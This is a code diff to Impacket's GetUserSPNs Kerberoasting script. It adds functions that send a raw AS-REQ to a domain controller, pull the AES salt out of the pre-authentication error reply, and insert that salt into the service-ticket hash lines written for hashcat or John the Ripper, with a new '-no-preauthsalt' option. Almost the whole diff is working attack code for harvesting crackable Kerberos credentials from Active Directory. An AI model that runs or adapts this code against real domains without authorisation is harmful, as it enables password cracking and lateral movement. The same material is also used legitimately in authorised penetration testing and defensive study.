@@ -32,25 +32,37 @@ from __future__ import division
 from __future__ import print_function
 import argparse
 import logging
+import random
+import socket
+import struct
 import sys
-from datetime import datetime
+from datetime import datetime, timedelta
 from binascii import hexlify, unhexlify
 
-from pyasn1.codec.der import decoder
+from pyasn1.type.univ import noValue
+from pyasn1.codec.der import decoder, encoder
 from impacket import version
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
     UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
 from impacket.examples import logger
 from impacket.examples.utils import parse_credentials
 from impacket.krb5 import constants
-from impacket.krb5.asn1 import TGS_REP, AS_REP
+from impacket.krb5.asn1 import TGS_REP, AS_REP, AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, \
+    seq_set, seq_set_iter, ETYPE_INFO2_ENTRY
 from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
-from impacket.krb5.types import Principal
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
+from impacket.krb5.types import Principal, KerberosTime
 from impacket.ldap import ldap, ldapasn1
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.ntlm import compute_lmhash, compute_nthash
 
+
+# Our random number generator
+try:
+    rand = random.SystemRandom()
+except NotImplementedError:
+    rand = random
+    pass
 
 class GetUserSPNs:
     @staticmethod
@@ -90,6 +102,8 @@ class GetUserSPNs:
         self.__saveTGS = cmdLineOptions.save
         self.__requestUser = cmdLineOptions.request_user
         self.__stealth = cmdLineOptions.stealth
+        self.__noPreAuthSalt = cmdLineOptions.no_preauthsalt
+
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
@@ -136,6 +150,94 @@ class GetUserSPNs:
         t -= 116444736000000000
         t /= 10000000
         return t
+    
+    def getPreAuthPacket(self, data, host, kdcHost, port=88):
+        '''based on impacket.krb5.kerberosv5.sendReceive'''
+        if kdcHost is None:
+            targetHost = host
+        else:
+            targetHost = kdcHost
+
+        messageLen = struct.pack('!i', len(data))
+
+        logging.debug('Trying to connect to KDC at %s:%s' % (targetHost, port))
+        try:
+            af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, port, 0, socket.SOCK_STREAM)[0]
+            s = socket.socket(af, socktype, proto)
+            s.connect(sa)
+        except socket.error as e:
+            raise socket.error("Connection error (%s:%s)" % (targetHost, port), e)
+
+        s.sendall(messageLen + data)
+        recvDataLen = struct.unpack('!i', s.recv(4))[0]
+
+        r = s.recv(recvDataLen)
+        while len(r) < recvDataLen:
+            r += s.recv(recvDataLen-len(r))
+        
+        return r
+
+    def getSalt(self, userName, domain):
+        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        asReq = AS_REQ()
+        domain = str(domain).upper()
+        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        pacRequest = KERB_PA_PAC_REQUEST()
+        pacRequest['include-pac'] = True
+        encodedPacRequest = encoder.encode(pacRequest)
+
+        asReq['pvno'] = 5
+        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+
+        asReq['padata'] = noValue
+        asReq['padata'][0] = noValue
+        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+        asReq['padata'][0]['padata-value'] = encodedPacRequest
+
+        reqBody = seq_set(asReq, 'req-body')
+
+        opts = list()
+        opts.append(constants.KDCOptions.forwardable.value)
+        opts.append(constants.KDCOptions.renewable.value)
+        opts.append(constants.KDCOptions.proxiable.value)
+        reqBody['kdc-options'] = constants.encodeFlags(opts)
+
+        seq_set(reqBody, 'sname', serverName.components_to_asn1)
+        seq_set(reqBody, 'cname', clientName.components_to_asn1)
+
+        reqBody['realm'] = domain
+
+        now = datetime.utcnow() + timedelta(days=1)
+        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['rtime'] = KerberosTime.to_asn1(now)
+        reqBody['nonce'] = random.getrandbits(31)
+
+        supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+
+        seq_set_iter(reqBody, 'etype', supportedCiphers)
+
+        message = encoder.encode(asReq)
+        logging.debug(f'Requesting Pre-Authentication package for user: {userName}')
+        r = self.getPreAuthPacket(message, domain, self.__kdcIP)
+
+        krbError = KerberosError(packet = decoder.decode(r, asn1Spec = KRB_ERROR())[0])
+        if krbError.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
+            eData = krbError.getErrorPacket()['e-data']
+            #logging.debug(krbError.getErrorPacket())
+            pas = decoder.decode(eData)[0]
+
+            for i in pas:
+                if i[0] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
+                    etype2 = decoder.decode(i[1][2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
+                    salt = str(etype2['salt']).replace(str(krbError.getErrorPacket()['realm']), '')
+
+                    return salt
+        
+        # this should only happen if the target does not require pre authentication
+        return None
 
     def getTGT(self):
         domain, _, TGT, _ = CCache.parseFile(self.__domain)
@@ -204,6 +306,13 @@ class GetUserSPNs:
             else:
                 fd.write(entry + '\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+            if not self.__noPreAuthSalt:
+                try:
+                    username = self.getSalt(username, decodedTGS['ticket']['realm'])
+                # lazy error handling :/
+                except Exception as e:
+                    logging.warning(f'Could not get AES salt - {username} most likely does not require preauthentication')
+
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                 spn.replace(':', '~'),
@@ -214,6 +323,13 @@ class GetUserSPNs:
             else:
                 fd.write(entry + '\n')
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+            if not self.__noPreAuthSalt:
+                try:
+                    username = self.getSalt(username, decodedTGS['ticket']['realm'])
+                # lazy error handling :/
+                except Exception as e:
+                    logging.warning(f'Could not get AES salt - {username} most likely does not require preauthentication')
+
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                 spn.replace(':', '~'),
@@ -505,6 +621,7 @@ if __name__ == '__main__':
                         help='Output filename to write ciphers in JtR/hashcat format. Auto selects -request')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-no-preauthsalt', action='store_true', help='Do not send a AS-REQ to obtain the AES salt and use the username as salt instead')
 
     group = parser.add_argument_group('authentication')
 
